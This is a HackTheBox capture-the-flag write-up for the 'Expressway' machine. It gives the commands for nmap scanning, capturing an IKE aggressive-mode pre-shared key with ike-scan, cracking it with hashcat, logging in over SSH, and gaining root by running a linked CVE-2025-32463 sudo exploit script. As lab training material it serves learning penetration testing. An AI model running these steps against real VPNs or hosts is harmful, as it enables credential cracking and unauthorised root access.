# HackTheBox - Expressway
**Youtube video:** https://youtu.be/RsoQJJvo8Is
---
## Initial Enumeration

**Nmap TCP Scan:**
```bash
# Full TCP port scan
nmap -Pn -sCV -p- $IP -vv -oN nmap_full -T4 --min-rate 2000 --max-retries 20 --open
```

**Nmap UDP Scan:**
```bash
# Top 50 UDP ports
nmap -Pn -sC -sU --top-ports=50 $IP --open -vv

# Targeted UDP scan
nmap -Pn -sC -sU -p 69,123,161,162,500,4500 $IP --open -vv

# IKE-specific scan
nmap -sU -p 500,4500 -Pn --script=ike* -vv $IP
```

---
## IPsec IKE Exploitation

**Understanding IKE/ISAKMP:**
```
# ISAKMP (Internet Security Association and Key Management Protocol)
# IKE for VPN negotiation
# IKE (Internet Key Exchange) - used to set up security associations in IPsec VPN
# Operates on UDP port 500

# Two main modes:
# 1. Main Mode: More secure, exchanges information in encrypted form
# 2. Aggressive Mode: Faster but less secure, exchanges identity information in cleartext
```

**IKE Enumeration:**
- **Reference:** https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html
```bash
# Check for Main Mode
ike-scan -M 172.16.21.200

# Check for Aggressive Mode
ike-scan -A 172.16.21.200

# Aggressive Mode with ID to capture PSK
ike-scan -A $IP --id=ike@expressway.htb --pskcrack
```

**Crack Pre-Shared Key:**
```bash
# Method 1: Hashcat
hashcat -m 5400 presharedkey.psk $rockyou

# Method 2: psk-crack
psk-crack -d $rockyou presharedkey.psk
```

**SSH Access:**
```bash
# Login with cracked credentials
ssh ike@expressway.htb
```

---
## Privilege Escalation

**Enumeration:**
- **Tool:** https://github.com/strikoder/LinEnum-ng
```bash
# Run LinEnum-ng
./linenum-ng.sh
```

**Exploit:** CVE-2025-32463 - chroot/chwoot Sudo Privilege Escalation
- **Payload:** https://gist.github.com/strikoder/439dab5928787b6dbd5bf990da9cf524
```bash
# Run privilege escalation exploit
bash CVE-2025-32463.sh
```
